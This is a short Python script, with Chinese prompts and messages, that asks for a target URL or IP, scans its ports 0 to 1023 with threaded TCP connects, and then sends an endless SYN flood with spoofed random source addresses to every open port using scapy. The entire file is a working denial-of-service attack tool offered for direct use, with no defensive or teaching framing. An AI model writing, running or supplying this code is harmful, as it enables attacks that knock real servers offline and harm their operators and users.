import socket  
import threading 
import time
import random
from scapy.all import *

socket.setdefaulttimeout(2)
openPort = []


def portTest(ip, port):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result=s.connect_ex((ip,port))
    if (result == 0 ):
        global openPort
        openPort.append(port)
        print("Port："+str(port)+" 開放")
    s.close()


def portScan(ip):
    threadsList = []
    for port in range(1024):
        thread = threading.Thread(target = portTest, args = (ip, port), name = 'port-'+str(port))
        thread.start()
        threadsList.append(thread)
        time.sleep(0.05)

    for t in threadsList:
        t.join()

def synAttack(ip, port):
    while 1:
        i = IP()
        i.src = str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))
        #i.src = '163.13.52.200'
        i.dst = ip

        t = TCP()
        t.sport = random.randint(1,65535)
        t.dport = port
        t.flags = 'S'

        send(i/t)
        print("Send "+str(ip)+":"+str(port)+" a SYN packets")


def setSynAttack(ip, portList):
    for port in portList:
        thread = threading.Thread(target = synAttack, args = (ip, port))
        thread.start()
        time.sleep(0.05)   

def main():
    domainName = input("輸入要攻擊的URL或IP：\n")
    serverIP  = socket.gethostbyname(domainName)

    print("-" * 60)
    print("現在將開始針對 " + str(domainName) + " 進行掃描")
    print("-" * 60)

    portScan(serverIP)
    #openPort = [21, 22, 25, 80, 110, 119, 143, 443, 465, 563, 587, 873, 993, 995]

    print("-" * 60)
    print("掃描結束，其所開放的port如下：")
    print(openPort)
    print("-" * 60)

    setSynAttack(serverIP,openPort)




main()






